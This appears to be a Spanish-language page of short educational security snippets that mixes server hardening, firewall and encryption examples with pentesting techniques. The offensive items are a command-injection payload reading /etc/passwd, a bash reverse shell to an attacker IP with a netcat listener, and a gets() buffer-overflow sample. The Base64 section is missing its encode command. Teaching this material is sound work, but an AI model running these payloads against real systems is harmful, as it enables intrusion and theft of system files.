[ TÉCNICA ] Enumeración de Subdominios (OSINT)

La recolección de información pasiva es el primer paso en un pentesting. Usar herramientas como `sublist3r` o métodos de certificados SSL son cruciales. Este es un ejemplo de un comando `amass` básico.


amass enum -d dominioobjetivo.com -o /tmp/subdomains.txt

Este comando enumera subdominios y guarda la salida para un análisis posterior. La efectividad de esta etapa define el éxito de las fases siguientes.

[ DEFENSIVO ] Hardening de Servidor Apache (Archivos .htaccess)

Fragmento de código esencial para mejorar la seguridad de un servidor web Apache. Desactiva la navegación de directorios y bloquea el acceso a archivos de configuración sensibles.


# Deshabilitar la navegación de directorios
Options -Indexes

# Bloquear acceso a archivos sensibles
<FilesMatch "\.(htaccess|htpasswd|ini|log|inc|bak)$">
    Require all denied
</FilesMatch>

# Forzar HTTPS (si se usa mod_rewrite)
RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]

[ CÓDIGO ] Ejemplo de Cifrado AES en Python

El cifrado simétrico AES es el estándar para la protección de datos. Aquí un snippet educativo usando la librería `cryptography` para cifrar y descifrar un mensaje.


from cryptography.fernet import Fernet

# Generar una clave para propósitos de demostración
# Esta clave debe ser almacenada de forma segura
key = Fernet.generate_key()
f = Fernet(key)

message = "Datos_Clasificados_2025".encode()
encrypted_message = f.encrypt(message)

print(f"Clave: {key.decode()}")
print(f"Mensaje Cifrado: {encrypted_message.decode()}")

# Descifrar
decrypted_message = f.decrypt(encrypted_message)
print(f"Mensaje Descifrado: {decrypted_message.decode()}")

Este código es un ejemplo básico y debe ser adaptado para entornos de producción.

[ TÉCNICA ] Inyección de Comandos (CMD Injection)

Una vulnerabilidad que permite a un atacante ejecutar comandos del sistema operativo a través de una aplicación web. El payload a menudo usa caracteres especiales como `;`, `|` o `&&`.


# Entrada normal:
ping -c 4 192.168.1.1

# Entrada con inyección:
ping -c 4 192.168.1.1; cat /etc/passwd

Si la aplicación no sanitiza correctamente la entrada del usuario, el comando `cat /etc/passwd` se ejecuta en el servidor. La mitigación es usar funciones específicas del lenguaje y evitar la ejecución de comandos externos.

[ PAYLOAD ] Shell Inversa de Netcat para Linux

Netcat (nc) es la "navaja suiza" de las redes. Aquí está el clásico comando para establecer una conexión de shell inversa, asumiendo que el atacante (LHOST) está escuchando en el puerto 4444.


# En la máquina víctima:
/bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# En la máquina atacante (escucha):
nc -lvnp 4444

Este es un concepto fundamental en la prueba de penetración para demostrar el control total de un sistema vulnerable. Solo para uso autorizado.

[ HERRAMIENTA ] Uso Básico de Wireshark (Filtros)

Wireshark es un analizador de protocolo de red. Los filtros son vitales para reducir la cantidad masiva de datos capturados. Aquí unos filtros útiles:


# Mostrar solo tráfico HTTP y SMTP
http or smtp

# Mostrar paquetes TCP con flag SYN activado (inicio de conexión)
tcp.flags.syn == 1 and tcp.flags.ack == 0

# Filtrar por IP de origen
ip.src == 192.168.1.10

[ SEGURIDAD CLOUD ] Principios Básicos de S3 Bucket Security

Un error común es dejar los buckets de Amazon S3 abiertos públicamente. El siguiente ejemplo es la política JSON que **debe evitarse** para prevenir exposición de datos.


{
    "Statement": [
        {
            "Sid": "PublicReadGetObject",
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::tu-bucket-nombre/*"
        }
    ]
}

**¡Advertencia!** Esta política permite la lectura pública. La configuración recomendada siempre debe restringir el `Principal` al mínimo necesario.

[ SEGURIDAD DE REDES ] Bloqueo de Ping (ICMP) en Firewalld

Un ejemplo de cómo deshabilitar las respuestas a solicitudes de ping (ICMP Echo Request) para aumentar la invisibilidad de un servidor Linux con `firewalld`.


# Primero, comprueba el estado actual
sudo firewall-cmd --query-icmp-block=echo-request

# Bloquea las peticiones de ping (temporal)
sudo firewall-cmd --add-icmp-block=echo-request

# Bloquea las peticiones de ping (permanente)
sudo firewall-cmd --add-icmp-block=echo-request --permanent

# Recarga el firewall para aplicar la regla permanente
sudo firewall-cmd --reload

[ CODIFICACIÓN ] Uso de Base64 para ofuscación básica

Base64 es un sistema de codificación, no de cifrado, pero a menudo se utiliza para ofuscar (ocultar a simple vista) strings en payloads o archivos de configuración. Ejemplo en Bash:


# Codificar:

# Salida: Q29tYW5kbyBvY3VsdG8K

# Decodificar:
echo "Q29tYW5kbyBvY3VsdG8K" | base64 -d

[ TÉCNICA ] Escaneo de Vulnerabilidades con Nessus/OpenVAS

Una breve guía conceptual sobre cómo configurar un escaneo de vulnerabilidades utilizando una herramienta comercial (Nessus) o de código abierto (OpenVAS). Estos escaneos son el corazón de la gestión de riesgos.

El escaneo requiere definir el **objetivo**, las **credenciales** (para escaneo autenticado) y la **política** (tipo de pruebas a ejecutar). Un escaneo no autenticado solo ve lo que un atacante externo vería, mientras que uno autenticado simula lo que un atacante interno podría hacer.

[ LENGUAJE C ] Función Vulnerable a Buffer Overflow (Concepto)

La vulnerabilidad de *buffer overflow* ocurre cuando un programa escribe más datos en un bloque de memoria de lo que se asignó. Aquí un ejemplo en C del uso inseguro de `gets()`:


#include <stdio.h>
#include <string.h>

void vulnerable_function() {
    char buffer[10]; // Buffer de solo 10 bytes
    printf("Introduce un string: ");
    gets(buffer); // FUNCIÓN INSEGURA: No verifica límites.
}

int main(int argc, char **argv) {
    vulnerable_function();
    printf("Programa finalizado.\n");
    return 0;
}

La solución es usar funciones seguras como `fgets()` con límites definidos o lenguajes que gestionen la memoria automáticamente.
